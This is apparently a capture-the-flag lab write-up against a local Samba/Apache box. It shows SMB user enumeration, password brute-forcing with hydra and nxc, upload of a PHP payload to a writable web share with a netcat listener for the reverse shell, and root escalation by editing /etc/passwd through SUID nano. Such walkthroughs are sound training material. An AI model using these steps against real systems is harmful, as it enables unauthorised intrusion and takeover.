# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.100 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.050 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1012ms
rtt min/avg/max/mdev = 0.050/0.075/0.100/0.025 ms
```
## Ports scanning (TCP)
``` sh
sudo nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 11:10 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 7E:61:A1:15:5A:46 (Unknown)

Host script results:
| smb2-time:
|   date: 2026-10-02T14:10:15
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.04 seconds
```
# Web enumeration
Web contains a simple explanation of Samba service. Since the box is focused on SMB enumeration i'll skip port 80 for now.
# SMB enumeration
## Null session
### Users
``` sh
crackmapexec smb 172.17.0.2 --users
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
SMB         172.17.0.2      445    434FC6C93381     [*] Windows 6.1 Build 0 (name:434FC6C93381) (domain:434FC6C93381) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    434FC6C93381     [-] Error enumerating domain users using dc ip 172.17.0.2: socket connection error while opening: [Errno 111] Connection refused
SMB         172.17.0.2      445    434FC6C93381     [*] Trying with SAMRPC protocol
SMB         172.17.0.2      445    434FC6C93381     [+] Enumerated domain user(s)
SMB         172.17.0.2      445    434FC6C93381     434FC6C93381\james
SMB         172.17.0.2      445    434FC6C93381     434FC6C93381\bob
SMB         172.17.0.2      445    434FC6C93381     [+] Enumerated domain user(s)
SMB         172.17.0.2      445    434FC6C93381     434FC6C93381\james
SMB         172.17.0.2      445    434FC6C93381     434FC6C93381\bob
```
Found users *james* and *bob*
### Shares
``` sh
smbmap -H 172.17.0.2

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        html                                                    NO ACCESS       HTML Share
        IPC$                                                    NO ACCESS       IPC Service (434fc6c93381 server (Samba, Ubuntu))
[*] Closed 1 connections
```
### Hydra
``` sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb2://172.17.0.2 -u -t 4
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-02 11:42:13
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 4 tasks per 1 server, overall 4 tasks, 28688798 login tries (l:2/p:14344399), ~7172200 tries per task
[DATA] attacking smb2://172.17.0.2:445/
[WARNING] 172.17.0.2 might accept any credential
[445][smb2] host: 172.17.0.2   login: bob   password: 123456
[WARNING] 172.17.0.2 might accept any credential
[WARNING] 172.17.0.2 might accept any credential
[WARNING] 172.17.0.2 might accept any credential
[445][smb2] host: 172.17.0.2   login: james   password: 123456
[445][smb2] host: 172.17.0.2   login: james   password: 12345
[445][smb2] host: 172.17.0.2   login: bob   password: 12345
```
Hydra gives false positives. Searching, i found i shoould use instead crackmapexec or its new version nxs.
### Brute force with nxc
``` sh
nxc smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
SMB         172.17.0.2      445    434FC6C93381     [+] 434FC6C93381\bob:star
```
## Bob session
### Shares
``` sh
smbmap -H 172.17.0.2 -u "bob" -p "star"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        html                                                    READ, WRITE     HTML Share
        IPC$                                                    NO ACCESS       IPC Service (434fc6c93381 server (Samba, Ubuntu))
[*] Closed 1 connections
```
Found the entry point. I can read and write the html share of the web
### Uploading the payload
``` sh
smbclient //172.17.0.2/html -U bob --password=star
smb: \> put payload.php
putting file payload.php as \payload.php (1264.6 kB/s) (average 1264.6 kB/s)
```
### Getting the shell
``` sh
sudo nc -lvnp 433
whoami
www-data
```
# Privilege escalation
## SUID binaries
``` sh
find / -perm -4000 2>/dev/null
/usr/bin/nano
```
``` sh
/usr/bin/nano /etc/passwd
# remove root password: root:x: -> root::
su -
whoami
root
```
